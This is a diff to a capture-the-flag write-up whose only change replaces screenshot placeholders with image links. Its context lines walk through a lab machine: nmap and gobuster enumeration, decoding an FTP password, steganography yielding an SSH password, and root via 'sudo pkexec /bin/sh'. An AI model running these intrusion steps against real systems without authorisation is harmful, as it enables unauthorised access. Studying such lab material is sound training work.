@@ -14,7 +14,7 @@ _In numbers_
 nmap -sV <TARGET_IP>
 ```
 
-[SCREEN01]
+<img width="724" height="214" alt="SCREEN01" src="https://github.com/user-attachments/assets/1fc0240f-1fa7-47dc-802f-e33358c6dd5c" />
 
 2. Directory enumeration using gobuster with a standard wordlist followed by a custom numeric wordlist for the `/island` path
    - Directory found: `/island/2100`
@@ -25,8 +25,9 @@ seq 1000 9999 > numbers.txt
 gobuster dir -u http://<TARGET_IP>/island -w numbers.txt
 ```
 
-[SCREEN02]
-[SCREEN03]
+<img width="724" height="412" alt="SCREEN02" src="https://github.com/user-attachments/assets/d9d32181-ba34-478d-9e3b-703df2b346d2" />
+
+<img width="723" height="413" alt="SCREEN03" src="https://github.com/user-attachments/assets/51f53a45-fd95-456f-a3d3-1c288b156154" />
 
 ---
 
@@ -41,7 +42,7 @@ _How would you search a file/directory by extension?_
 gobuster dir -u http://<TARGET_IP>/island/2100 -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
 ```
 
-[SCREEN04]
+<img width="720" height="411" alt="SCREEN04" src="https://github.com/user-attachments/assets/c5198106-dbc1-4154-8216-22c3740bf852" />
 
 ---
 
@@ -51,7 +52,7 @@ _Looks like base? https://gchq.github.io/CyberChef/_
 
 1. Analysis of the ticket file at `http://<TARGET_IP>/island/2100/green_arrow.ticket` reveals an encoded string `RTy8yhBQdscX`. Decoding this Base58 encoded string using [CyberChef](https://gchq.github.io/CyberChef/) yields the FTP password: `!#th3h00d`
 
-[SCREEN05]
+<img width="821" height="527" alt="SCREEN05" src="https://github.com/user-attachments/assets/3f28fbde-cb70-4a92-84bb-7b659a0fbbad" />
 
 ---
 
@@ -69,7 +70,7 @@ ls -la
 mget *
 ```
 
-[SCREEN06]
+<img width="722" height="415" alt="SCREEN06" src="https://github.com/user-attachments/assets/2e9af690-31a4-4ee0-83ea-a3122a424fc7" />
 
 3. File analysis reveals steganographic content requiring extraction. The corrupted PNG file header needs repair before steganographic analysis.
    - File containing SSH password: `shado`
@@ -93,7 +94,7 @@ ssh slade@<TARGET_IP>
 cat /home/slade/user.txt
 ```
 
-[SCREEN07]
+<img width="719" height="68" alt="SCREEN07" src="https://github.com/user-attachments/assets/84834133-a604-4065-96ca-cfead72566e6" />
 
 ---
 
@@ -105,7 +106,7 @@ cat /home/slade/user.txt
 sudo -l
 ```
 
-[SCREEN08]
+<img width="722" height="162" alt="SCREEN08" src="https://github.com/user-attachments/assets/fcfedd9b-6dbb-49db-9dba-82bf1fffa179" />
 
 2. Exploitation using pkexec binary with sudo privileges. Reference [GTFOBins](https://gtfobins.github.io/gtfobins/pkexec) for `pkexec` exploitation techniques
 
@@ -114,4 +115,4 @@ sudo pkexec /bin/sh
 cat /root/root.txt
 ```
 
-[SCREEN09]
+<img width="719" height="286" alt="SCREEN09" src="https://github.com/user-attachments/assets/4eb6eeb4-b067-41b9-9ec2-1f1811e93a1d" />
